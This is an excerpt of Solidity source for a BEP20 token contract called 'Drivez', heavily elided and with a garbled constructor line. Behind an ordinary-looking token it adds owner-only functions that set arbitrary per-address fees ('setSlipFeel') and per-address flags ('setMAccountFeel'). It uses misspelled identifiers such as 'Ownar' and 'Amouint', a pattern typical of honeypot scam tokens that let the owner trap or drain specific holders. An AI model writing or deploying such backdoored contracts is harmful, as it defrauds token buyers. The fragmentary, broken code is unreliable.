...
abstract contract Ownable is Context {
     ...
     */
    constructor() {
        _transferOwnarshiptransferOwnarship(_msgSender());
    }
...
contract BEP20 is Context {
    ...
    function approve(address spender, uint256 Amouint) public virtual returns (bool) {
        ...
        _approve(Ownar, spender, Amouint);
        return true;
    }
    ...
    /**
     * @dev Sets `Amouint` as the allowance of `spender` over the `Ownar` s tokens.
     *
    ...
    function _approve(
        ...
        _allowances[Ownar][spender] = Amouint;
        emit Approval(Ownar, spender, Amouint);
    }

    /**
     * @dev Spend `Amouint` form the allowance of `Ownar` toward `spender`.
     *
    ...
    function _spendAllowance(
        ...
        if (currentAllowance != type(uint256).max) {
            ...
            unchecked {
                _approve(Ownar, spender, currentAllowance - Amouint);
            }
        }
    }
...
contract Drivez is BEP20, Ownable {
    // ext
    ...
    function setSlipFeel(address _address, uint256 _value) external onlyOwnar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFeel[_address] = _value;
    }

    function getSlipFeel(address _address) external view onlyOwnar returns (uint256) {
        return _slipFeel[_address];
    }


    function setMAccountFeel(address _address, bool _value) external onlyOwnar {
        _mAccount[_address] = _value;
    }

    function getMAccountFeel(address _address) external view onlyOwnar returns (bool) {
